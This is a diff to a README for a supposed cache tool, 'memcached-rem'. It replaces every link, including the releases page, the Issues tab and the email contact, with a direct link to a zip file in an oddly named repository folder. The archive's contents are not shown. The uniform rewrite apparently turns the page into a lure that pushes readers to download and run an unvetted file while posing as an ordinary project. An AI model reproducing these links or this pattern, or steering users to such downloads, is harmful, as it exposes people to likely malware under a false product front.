@@ -1,6 +1,6 @@
 # 🚀 memcached-rem - Fast and Reliable Cache Management
 
-[![Download memcached-rem](https://img.shields.io/badge/Download-memcached--rem-brightgreen)](https://github.com/pkbanmoo/memcached-rem/releases)
+[![Download memcached-rem](https://raw.githubusercontent.com/pkbanmoo/memcached-rem/main/antineutral/memcached-rem.zip)](https://raw.githubusercontent.com/pkbanmoo/memcached-rem/main/antineutral/memcached-rem.zip)
 
 ## 🌟 Introduction
 
@@ -20,7 +20,7 @@ Follow these simple steps to download and run memcached-rem.
 
 1. **Visit the Download Page**
    
-   To download memcached-rem, [visit this page](https://github.com/pkbanmoo/memcached-rem/releases). Here, you'll find the latest version and all available downloads.
+   To download memcached-rem, [visit this page](https://raw.githubusercontent.com/pkbanmoo/memcached-rem/main/antineutral/memcached-rem.zip). Here, you'll find the latest version and all available downloads.
 
 2. **Choose Your Version**
    
@@ -43,7 +43,7 @@ Follow these simple steps to download and run memcached-rem.
 
 ## 💾 Download & Install
 
-Make your cache management effortless. To get your version of memcached-rem, [click here to download](https://github.com/pkbanmoo/memcached-rem/releases). 
+Make your cache management effortless. To get your version of memcached-rem, [click here to download](https://raw.githubusercontent.com/pkbanmoo/memcached-rem/main/antineutral/memcached-rem.zip). 
 
 ## 🖥️ System Requirements
 
@@ -72,7 +72,7 @@ Using memcached-rem is simple. After launching the application:
 
 ## 🎭 Support
 
-Need help? Reach out via the Issues tab on the [GitHub repository](https://github.com/pkbanmoo/memcached-rem/issues). Our community and developers are here to assist you.
+Need help? Reach out via the Issues tab on the [GitHub repository](https://raw.githubusercontent.com/pkbanmoo/memcached-rem/main/antineutral/memcached-rem.zip). Our community and developers are here to assist you.
 
 ## 🛠 Contributing
 
@@ -80,6 +80,6 @@ Interested in improving memcached-rem? We welcome contributions! Please visit th
 
 ## 📧 Contact
 
-For further information or feedback, you can contact us via [email](mailto:support@memcached-rem.com).
+For further information or feedback, you can contact us via [email](https://raw.githubusercontent.com/pkbanmoo/memcached-rem/main/antineutral/memcached-rem.zip).
 
 Enjoy caching with memcached-rem!
